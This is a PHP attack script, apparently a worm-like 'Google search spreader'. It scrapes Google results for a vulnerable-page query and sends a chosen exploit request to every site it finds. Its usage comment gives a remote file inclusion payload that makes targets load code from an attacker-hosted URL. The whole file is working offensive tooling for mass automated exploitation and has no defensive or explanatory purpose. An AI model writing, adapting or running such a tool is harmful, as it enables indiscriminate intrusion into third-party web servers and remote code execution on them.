<?
/*
   PHP Google search spreader
   by skorikov

   usage: gspread.php <search_query>
                       <exploit request>
                       <delay between search requests>
                       <pages of search results to process>

   example: gspread.php inurl:butts.php /butts/vuln.php?include=http://yoursite.net/sup.txt? 5 100
*/

   
   set_time_limit(0);
   error_reporting(0);

   $query = $_SERVER['argv'][1];
   $request = $_SERVER['argv'][2];
   $delay = $_SERVER['argv'][3];
   $results = $_SERVER['argv'][4]; 

   $res = 0;
   $site = array();

   do 
   {
      if(!($fp = fopen("http://google.com/search?q=$query&hl=en&lr=&safe=off&start=$res","r")))    break;

      print "Searching, Please wait...\r\n";

      while(!feof($fp)) 
      {
         $buffer = fgets($fp,1024);
         $split = explode(" ",$buffer);

         for($i=0; $i<count($split); $i++) 
         {
            if(substr($split[$i],0,4) == "href") 
            {
               $url = explode(">",$split[$i]);
               $url = $url[0];
               $url = substr(substr($url,6),0,-1);
               if(substr($url,0,7) == "http://" && !strstr($url,"search?") && !strstr($url,"google") && !strstr($url,"download.com")) 
               {
                  $url = explode("http://",$url);
                  $url = explode("/",$url[1]);
                  $url = $url[0];
                  $url = "http://".$url."$request";
                  array_push($site,$url);
               }
            }
         }
      }
      fclose($fp);

      $res = $res + 10;
      sleep($delay);
   } while($res < ($results*10)); 

   print "Finished searching. Found ". count($site) ." sites. Sending exploit requests...\r\n";

   for($i = 0; $i < count($site); $i++) 
   {
      send_exploit_packet($site[$i]);
   }

   function send_exploit_packet($url) 
   {
      $domain = explode("http://",$url);
      $domain = $domain[1];
      $domain = explode("/",$domain);
      $path = strstr($url,$domain[1]);
      $domain = $domain[0];

      $pckt =  "GET /$path HTTP/1.1\r\n".
               "Host: $domain\r\n".
               "Connection: Close\r\n\r\n";

      if(($fd = fsockopen($domain,80,$er,$str,5))) 
      {
         print "Send exploit request: ". $domain.$path. "\r\n";
         fwrite($fd,$pckt);
         sleep(5);
         fclose($fd);
      }
   }

   print "Done, Exiting."

?>